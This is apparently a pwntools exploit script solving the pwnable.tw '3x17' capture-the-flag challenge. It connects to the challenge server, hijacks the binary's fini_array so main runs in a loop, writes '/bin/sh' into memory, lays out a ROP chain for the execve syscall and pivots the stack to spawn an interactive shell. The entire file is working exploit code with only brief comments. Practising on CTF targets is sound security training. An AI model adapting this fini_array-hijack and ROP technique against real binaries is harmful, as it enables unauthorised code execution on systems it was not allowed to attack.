#coding:utf-8
from pwn import *
context(arch="amd64",os='linux',log_level='debug')
#p = process('./3x17')
p = remote("chall.pwnable.tw", 10105)

syscall_ret = 0x471db5
pop_rax_ret = 0x41e4af
pop_rdx_ret = 0x446e35
pop_rsi_ret = 0x406c30
pop_rdi_ret = 0x401696

bin_sh_addr = 0x4B9500

fini_array = 0x4B40F0
main_addr = 0x401B6D
libc_csu_fini = 0x402960
leave_ret = 0x401C4B

esp = 0x4B4100
ret = 0x401016


def write(addr,data):
    p.sendafter('addr:',str(addr))
    p.sendafter('data:',data)

#Make the program run in a loop fini_array[0] fini_array[1]
write(fini_array,p64(libc_csu_fini)+p64(main_addr))
 #Write /bin/sh in a readable and writable place
write(bin_sh_addr,"/bin/sh\x00")

#syscall('/bin/sh\x00',0,0)
write(esp,p64(pop_rax_ret))
write(esp+8,p64(0x3b))
write(esp+16,p64(pop_rdi_ret))
write(esp+24,p64(bin_sh_addr))
write(esp+32,p64(pop_rsi_ret))
write(esp+40,p64(0))
write(esp+48,p64(pop_rdx_ret))
write(esp+56,p64(0))
write(esp+64,p64(syscall_ret))
#gdb.attach(p,"b *0x401C4B")
 #End the program loop and enter ROP
write(fini_array,p64(leave_ret)+p64(ret))

p.interactive()